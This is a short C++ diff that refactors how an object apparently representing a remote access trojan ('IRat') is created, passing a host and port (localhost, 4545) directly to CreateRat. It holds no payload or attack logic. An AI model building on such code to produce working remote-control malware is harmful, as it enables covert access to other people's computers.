@@ -9,7 +9,8 @@ int main()
 
 	const std::unique_ptr<IRat> rat = CreateRat(
 		factory.get(),
-		factory->CreateWinSockConnectionFactory("localhost", 4545));
+		"localhost", 
+		4545);
 
 	//MSG Msg; // msg object to be processed, but actually never is processed
 	//while (GetMessage(&Msg, NULL, 0, 0)) // empties console window
